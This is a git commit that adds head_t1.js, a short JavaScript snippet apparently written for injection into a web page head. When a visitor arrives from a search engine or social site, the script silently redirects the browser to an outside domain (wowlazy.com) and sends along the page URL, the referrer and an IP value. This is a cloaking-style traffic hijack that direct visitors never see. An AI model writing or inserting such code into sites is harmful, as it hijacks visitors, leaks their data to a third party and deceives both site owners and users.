1ae82f419d69341aaeb1d0eae569cf6c2e588a71
pgpump <pg079898@gmail.com>
2025-06-02 11:00:42 +0700

    Create head_t1.js

---
+++ head_t1.js
@@ -0,0 +1,6 @@
+///// Arsae /////
+var arsT1Bing = 'https://en.wowlazy.com';
+
+if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
+}
